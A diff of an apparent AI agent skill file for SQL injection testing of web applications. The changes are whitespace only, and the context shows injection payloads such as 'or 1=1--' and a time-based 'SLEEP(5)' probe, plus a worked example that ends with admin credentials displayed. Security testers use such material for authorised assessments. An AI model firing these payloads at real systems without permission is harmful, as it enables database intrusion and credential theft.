@@ -1,4 +1,4 @@
-﻿---
+---
 name: sql-injection-testing
 description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
 risk: offensive
@@ -57,6 +57,7 @@ Execute comprehensive SQL injection vulnerability assessments on web application
 Locate user-controlled input fields that interact with database queries:
 
 ```
+
 # Common injection points
 - URL parameters: ?id=1, ?user=admin, ?category=books
 - Form fields: username, password, search, comments
@@ -101,7 +102,7 @@ page.asp?id=1 or 1=1
 page.asp?id=1' or 1=1--
 page.asp?id=1" or 1=1--
 
--- False condition tests  
+-- False condition tests
 page.asp?id=1 and 1=2
 page.asp?id=1' and 1=2--
 ```
@@ -359,7 +360,7 @@ GET /product.php?id=5 HTTP/1.1
 **Detection Test**:
 ```
 GET /product.php?id=5' HTTP/1.1
-Response: MySQL error - syntax error near ''' 
+Response: MySQL error - syntax error near '''
 ```
 
 **Column Enumeration**:
@@ -382,7 +383,7 @@ Response: Displays admin credentials
 
 **Confirm Vulnerability**:
 ```sql
-id=5' AND SLEEP(5)-- 
+id=5' AND SLEEP(5)--
 -- Response delayed by 5 seconds (vulnerable confirmed)
 ```
 
